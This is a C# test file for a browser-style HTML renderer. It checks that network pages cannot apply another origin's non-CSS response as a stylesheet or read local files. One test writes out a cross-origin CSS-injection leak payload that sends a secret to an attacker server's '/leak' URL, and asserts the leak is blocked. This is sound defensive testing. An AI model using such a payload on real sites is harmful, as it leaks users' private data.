using System.Net;
using System.Net.Sockets;
using Broiler.HTML.Core.Entities;
using Broiler.HTML.Orchestration.Handlers;
using Broiler.Net.Http;

namespace Broiler.HTML.Tests;

/// <summary>
/// What a network document must not be able to do through its subresources now that they carry the profile's
/// cookies: read another origin's non-CSS response as a stylesheet, or reach the local file system. Plus the
/// <c>url()</c> rebasing a transport-loaded sheet relies on, and the cache a host shares between the containers of
/// one document.
/// </summary>
public sealed class SubresourceSecurityTests
{
    private const string Profile = "sid=ALICE";

    private static LoopbackResponse Login() =>
        LoopbackResponse.Text("text/html", "<p>signed in</p>", ("Set-Cookie", Profile + "; Path=/"));

    [Theory]
    [InlineData(false)]
    [InlineData(true)]
    public void ACrossOriginResponseThatIsNotCssIsNeverAppliedAsAStylesheet(bool noSniff)
    {
        using var attacker = new LoopbackHttpServer(_ => LoopbackResponse.Text("text/plain", "x"));

        // The victim's page answers with HTML the attacker partly controls, around a secret. Parsed as CSS it would
        // size #box and request the attacker's URL with the secret in it.
        var inbox = "{}#box{width:77px;height:1px;background-image:url(" + attacker.Url("/leak?ALICE-SECRET") + ")}";
        using var victim = new LoopbackHttpServer(request => request.Path switch
        {
            "/login" => Login(),
            "/inbox" => noSniff
                ? LoopbackResponse.Text("text/html", inbox, ("X-Content-Type-Options", "nosniff"))
                : LoopbackResponse.Text("text/html", inbox),
            _ => LoopbackResponse.NotFound(),
        });
        using var session = new BrowserNetworkSession();
        TestContent.Navigate(session, victim.Url("/login"));

        // The attacker's document is on another port of the same host: cross-origin, same-site, so the no-cors
        // request carries the victim's cookie. No doctype: quirks mode, whose exception is for same-origin sheets only.
        var page = attacker.Url("/page");
        using var container = TestContent.Container(session, DocumentRequestContext.CreateTopLevel(new Uri(page)));

        var errors = TestContent.Render(container,
            $"<html><head><link rel=\"stylesheet\" href=\"{victim.Url("/inbox")}\"></head><body><div id=\"box\">x</div></body></html>",
            page);

        Assert.Equal(Profile, victim.Single("/inbox").Cookie);
        Assert.Contains(HtmlRenderErrorType.CssParsing, errors);
        Assert.NotEqual(77, container.GetElementRectangle("box")!.Value.Width);
        Assert.Empty(attacker.RequestsFor("/leak"));
    }

    [Theory]
    [InlineData("text/css", false, false, true)]
    [InlineData("text/css; charset=utf-8", false, false, true)]
    [InlineData("text/plain", true, false, true)]
    [InlineData("text/plain", false, false, false)]
    [InlineData("text/plain", true, true, false)]
    [InlineData("text/css", true, true, true)]
    public void ASameOriginSheetNeedsTextCssUnlessTheDocumentIsInQuirksMode(
        string contentType, bool quirksMode, bool noSniff, bool applied)
    {
        using var server = new LoopbackHttpServer(request => request.Path switch
        {
            "/sheet.css" => noSniff
                ? LoopbackResponse.Text(contentType, "#box { width: 31px; height: 1px; }", ("X-Content-Type-Options", "nosniff"))
                : LoopbackResponse.Text(contentType, "#box { width: 31px; height: 1px; }"),
            _ => LoopbackResponse.NotFound(),
        });
        using var session = new BrowserNetworkSession();
        var page = server.Url("/page");
        using var container = TestContent.Container(session, DocumentRequestContext.CreateTopLevel(new Uri(page)));

        var doctype = quirksMode ? string.Empty : "<!DOCTYPE html>";
        TestContent.Render(container,
            $"{doctype}<html><head><link rel=\"stylesheet\" href=\"/sheet.css\"></head><body><div id=\"box\">x</div></body></html>",
            page);

        server.Single("/sheet.css");
        Assert.Equal(applied, container.GetElementRectangle("box")!.Value.Width == 31);
    }

    [Theory]
    [InlineData("text/css", ResponseTainting.Opaque, false, false, true)]
    [InlineData("TEXT/CSS", ResponseTainting.Opaque, false, false, true)]
    [InlineData(null, ResponseTainting.Basic, true, false, true)]
    [InlineData(null, ResponseTainting.Basic, false, false, false)]
    [InlineData("text/html", ResponseTainting.Cors, true, false, true)]
    [InlineData("text/html", ResponseTainting.Opaque, true, false, false)]
    [InlineData("text/html", ResponseTainting.Basic, true, true, false)]
    public void TheStylesheetRuleFollowsHtmlAndFetch(string? mediaType, ResponseTainting tainting, bool quirksMode, bool noSniff, bool accepted) =>
        Assert.Equal(accepted, StylesheetLoadHandler.IsAcceptableStyleSheet(new(mediaType, tainting, noSniff), quirksMode));

    [Fact]
    public void QuotedUrlsInATransportLoadedSheetAreRebasedOnItsFinalUrl()
    {
        using var server = new LoopbackHttpServer(request => request.Path switch
        {
            "/old/style.css" => LoopbackResponse.Redirect("/sub/style.css"),
            "/sub/style.css" => LoopbackResponse.Text("text/css",
                "@font-face { font-family: Quoted; src: url(\"font.woff2\") format(\"woff2\"); }" +
                "@font-face { font-family: Single; src: url( 'single.woff2' ); }" +
                "#box { width: 5px; height: 5px; }"),
            "/sub/font.woff2" or "/sub/single.woff2" => LoopbackResponse.Ok("font/woff2", TestContent.Font),
            _ => LoopbackResponse.NotFound(),
        });
        using var session = new BrowserNetworkSession();
        var page = server.Url("/page");
        using var container = TestContent.Container(session, DocumentRequestContext.CreateTopLevel(new Uri(page)));

        TestContent.Render(container, """
            <link rel="stylesheet" href="/old/style.css">
            <div id="box" style="font-family: Quoted">x</div><div style="font-family: Single">y</div>
            """, page);

        server.Single("/sub/font.woff2");
        server.Single("/sub/single.woff2");
        Assert.DoesNotContain(server.Requests, request => request.Target.Contains("%22", StringComparison.Ordinal));
        Assert.DoesNotContain(server.Requests, request => request.Target.Contains("%27", StringComparison.Ordinal));
    }

    [Fact]
    public void UrlRebasingReadsTheArgumentTheWayCssDoes()
    {
        var sheet = StylesheetLoadHandler.CorrectRelativeUrls(
            "a { b: url(\"x.png\"); c: url('y (1).png'); d: url( z.png ); e: url(data:image/png;base64,AA==); f: url(\"https://cdn.test/w.png\"); }",
            new Uri("http://site.test/css/main.css"));

        Assert.Equal(
            "a { b: url(\"http://site.test/css/x.png\"); c: url('http://site.test/css/y%20(1).png'); d: url( http://site.test/css/z.png ); " +
            "e: url(data:image/png;base64,AA==); f: url(\"https://cdn.test/w.png\"); }",
            sheet);
    }

    [Fact]
    public void ANetworkDocumentNeverReadsStylesheetsOrImagesFromTheFileSystem()
    {
        var directory = Directory.CreateTempSubdirectory("broiler-html-local-");
        try
        {
            var sheet = Path.Combine(directory.FullName, "secret.css");
            File.WriteAllText(sheet, "#box { width: 91px; height: 1px; }");
            var image = Path.Combine(directory.FullName, "local.png");
            File.WriteAllBytes(image, TestContent.Png);
            var sheetUrl = new Uri(sheet).AbsoluteUri;
            var imageUrl = new Uri(image).AbsoluteUri;
            var html = $"<link rel=\"stylesheet\" href=\"{sheetUrl}\"><div id=\"box\">x</div><img src=\"{imageUrl}\">";

            using var server = new LoopbackHttpServer(_ => LoopbackResponse.NotFound());
            using var session = new BrowserNetworkSession();
            var page = server.Url("/page");
            using var web = TestContent.Container(session, DocumentRequestContext.CreateTopLevel(new Uri(page)));

            var errors = TestContent.Render(web, html, page);

            Assert.NotEqual(91, web.GetElementRectangle("box")!.Value.Width);
            Assert.Contains(HtmlRenderErrorType.CssParsing, errors);
            Assert.Contains(HtmlRenderErrorType.Image, errors);

            // A file: document is entitled to its own directory, with or without a transport.
            var local = new Uri(Path.Combine(directory.FullName, "page.html")).AbsoluteUri;
            using var file = TestContent.Container(session, DocumentRequestContext.CreateTopLevel(new Uri(local)));
            var fileErrors = TestContent.Render(file, html, local);

            Assert.Equal(91, file.GetElementRectangle("box")!.Value.Width);
            Assert.Empty(fileErrors);
        }
        finally
        {
            directory.Delete(recursive: true);
        }
    }

    [Fact]
    public void AProtocolRelativeImageInANetworkDocumentIsANetworkLoad()
    {
        using var server = new LoopbackHttpServer(request => request.Path switch
        {
            "/img.png" => LoopbackResponse.Ok("image/png", TestContent.Png),
            _ => LoopbackResponse.NotFound(),
        });
        using var session = new BrowserNetworkSession();
        var page = server.Url("/page");
        using var container = TestContent.Container(session, DocumentRequestContext.CreateTopLevel(new Uri(page)));

        // On Windows "//host/path" is a rooted (UNC) path; for a web page it is a URL on the page's scheme.
        var errors = TestContent.Render(container, $"<img src=\"//127.0.0.1:{server.Port}/img.png\">", page);

        server.Single("/img.png");
        Assert.Empty(errors);
    }

    /// <summary>
    /// A same-origin <c>text/plain</c> sheet a quirks-mode document may apply is not applied to a
    /// standards-mode document that shares the cache: a cached response meets each requester's checks.
    /// </summary>
    [Fact]
    public void ASheetAcceptedForAQuirksDocumentIsNotAppliedFromTheCacheToAStandardsOne()
    {
        using var server = new LoopbackHttpServer(request => request.Path switch
        {
            "/sheet.txt" => LoopbackResponse.Text("text/plain", "#box { width: 31px; height: 1px; }"),
            _ => LoopbackResponse.NotFound(),
        });
        using var session = new BrowserNetworkSession();
        var page = server.Url("/page");
        var document = DocumentRequestContext.CreateTopLevel(new Uri(page));
        const string body = "<head><link rel=\"stylesheet\" href=\"/sheet.txt\"></head><body><div id=\"box\">x</div></body>";

        using var quirks = TestContent.Container(session, document);
        TestContent.Render(quirks, "<html>" + body + "</html>", page);
        Assert.Equal(31, quirks.GetElementRectangle("box")!.Value.Width);

        using var standards = TestContent.Container(session, document);
        Assert.True(standards.ShareSubresourceCacheWith(quirks));
        var errors = TestContent.Render(standards, "<!DOCTYPE html><html>" + body + "</html>", page);

        Assert.NotEqual(31, standards.GetElementRectangle("box")!.Value.Width);
        Assert.Contains(HtmlRenderErrorType.CssParsing, errors);
        server.Single("/sheet.txt");
    }

    /// <summary>
    /// URLs a browser loads although <c>Uri.IsWellFormedUriString</c> refuses them -- an unescaped space
    /// in a relative or an absolute image URL, a <c>|</c> in a query, a Google Fonts v1 family list --
    /// are requested through the transport by a web document, not refused as local paths.
    /// </summary>
    [Fact]
    public void UrlsWithCharactersABrowserEncodesAreLoadedFromTheNetwork()
    {
        using var server = new LoopbackHttpServer(request => request.Path switch
        {
            "/images/a%20b.png" or "/abs%20c.png" or "/q.png" => LoopbackResponse.Ok("image/png", TestContent.Png),
            "/css" => LoopbackResponse.Text("text/css", "#box { width: 7px; height: 7px; }"),
            _ => LoopbackResponse.NotFound(),
        });
        using var session = new BrowserNetworkSession();
        var page = server.Url("/dir/page");
        using var container = TestContent.Container(session, DocumentRequestContext.CreateTopLevel(new Uri(page)));

        var errors = TestContent.Render(container,
            $"<link rel=\"stylesheet\" href=\"{server.Url("/css?family=Open+Sans|Roboto")}\">" +
            "<img src=\"/images/a b.png\">" +
            $"<img src=\"{server.Url("/abs c.png")}\">" +
            "<img src=\"/q.png?a=1|2\"><div id=\"box\">x</div>",
            page);

        server.Single("/images/a%20b.png");
        server.Single("/abs%20c.png");
        server.Single("/q.png");
        server.Single("/css");
        Assert.Equal(7, container.GetElementRectangle("box")!.Value.Width);
        Assert.Empty(errors);
    }

    /// <summary>
    /// Only a real <c>url(</c> token is rebased: one inside a comment or a string is text, a quoted
    /// argument that meets a newline is a bad string, and neither swallows the rules after it; an
    /// argument's CSS escapes are decoded before it is resolved, and the result is written back so it
    /// cannot end the string or the function early.
    /// </summary>
    [Theory]
    [InlineData(
        "/* legacy: url( is not supported here */ #a{width:5px} #b{background:url(img/b.png)}",
        "/* legacy: url( is not supported here */ #a{width:5px} #b{background:url(https://site.example/css/img/b.png)}")]
    [InlineData(
        "a{content:\"url(\";} b{c:url(\"y.png\")}",
        "a{content:\"url(\";} b{c:url(\"https://site.example/css/y.png\")}")]
    [InlineData(
        "a{b:url(\"x.png\n);} c{d:url(\"y.png\")}",
        "a{b:url(\"x.png\n);} c{d:url(\"https://site.example/css/y.png\")}")]
    [InlineData(
        "a{b:url(\"sp\\61 ce.png\")} c{d:url(e\\ f.png)}",
        "a{b:url(\"https://site.example/css/space.png\")} c{d:url(https://site.example/css/e%20f.png)}")]
    [InlineData(
        "a{b:url(x y.png)} c{d:url(z.png)}",
        "a{b:url(x y.png)} c{d:url(https://site.example/css/z.png)}")]
    [InlineData(
        "a{b:my-url(x.png); c:url('q\\'uote.png')}",
        "a{b:my-url(x.png); c:url('https://site.example/css/q\\'uote.png')}")]
    public void UrlRebasingSkipsCommentsAndStringsAndKeepsTheRulesAfterThem(string sheet, string expected) =>
        Assert.Equal(expected, StylesheetLoadHandler.CorrectRelativeUrls(sheet, new Uri("https://site.example/css/main.css")));

    [Fact]
    public void ContainersOfOneDocumentCanShareTheirSubresourceCache()
    {
        using var server = new LoopbackHttpServer(request => request.Path switch
        {
            "/style.css" => LoopbackResponse.Text("text/css", "#box { width: 9px; height: 9px; }"),
            "/font.woff2" => LoopbackResponse.Ok("font/woff2", TestContent.Font),
            "/img.png" => LoopbackResponse.Ok("image/png", TestContent.Png),
            _ => LoopbackResponse.NotFound(),
        });
        using var session = new BrowserNetworkSession();
        var page = server.Url("/page");
        var document = DocumentRequestContext.CreateTopLevel(new Uri(page));
        const string html = """
            <link rel="stylesheet" href="/style.css">
            <style>@font-face { font-family: Probe; src: url(/font.woff2); }</style>
            <div id="box" style="font-family: Probe"></div><img src="/img.png">
            """;

        var frame = TestContent.Container(session, document);
        TestContent.Render(frame, html, page);

        // The next frame of the same document, then the finished page: nothing is fetched again, even after the
        // container the cache came from is gone.
        using var next = TestContent.Container(session, document);
        Assert.True(next.ShareSubresourceCacheWith(frame));
        frame.Dispose();
        TestContent.Render(next, html, page);
        Assert.Equal(9, next.GetElementRectangle("box")!.Value.Width);

        using var final = TestContent.Container(session, document);
        Assert.True(final.ShareSubresourceCacheWith(next));
        TestContent.Render(final, html, page);

        foreach (var path in new[] { "/style.css", "/font.woff2", "/img.png" })
            server.Single(path);

        // Another document's container, or another transport's, keeps a cache of its own.
        using var other = TestContent.Container(session, DocumentRequestContext.CreateTopLevel(new Uri(page)));
        using var source = TestContent.Container(session, document);
        Assert.False(other.ShareSubresourceCacheWith(source));
        using var recorded = TestContent.Container(new RecordingTransport(session), document);
        Assert.False(recorded.ShareSubresourceCacheWith(source));
        using var legacy = TestContent.Container();
        using var legacySource = TestContent.Container();
        Assert.False(legacy.ShareSubresourceCacheWith(legacySource));
    }

    [Fact]
    public void TheLoopbackServerNeverSharesItsLocalhostPortWithAnotherListener()
    {
        if (!Socket.OSSupportsIPv6)
            return;

        // Someone else holds [::1] at a port that is free on 127.0.0.1.
        var foreign = new TcpListener(IPAddress.IPv6Loopback, 0);
        foreign.Start();
        try
        {
            var port = ((IPEndPoint)foreign.LocalEndpoint).Port;
            var listeners = new List<TcpListener>();

            bool bound;
            try
            {
                bound = LoopbackHttpServer.TryBindLoopbackPair(port, listeners, out _);
            }
            catch (SocketException)
            {
                // 127.0.0.1 at that port is taken as well; nothing to show on this machine.
                return;
            }

            Assert.False(bound);
            Assert.Empty(listeners);
        }
        finally
        {
            foreign.Stop();
        }
    }
}
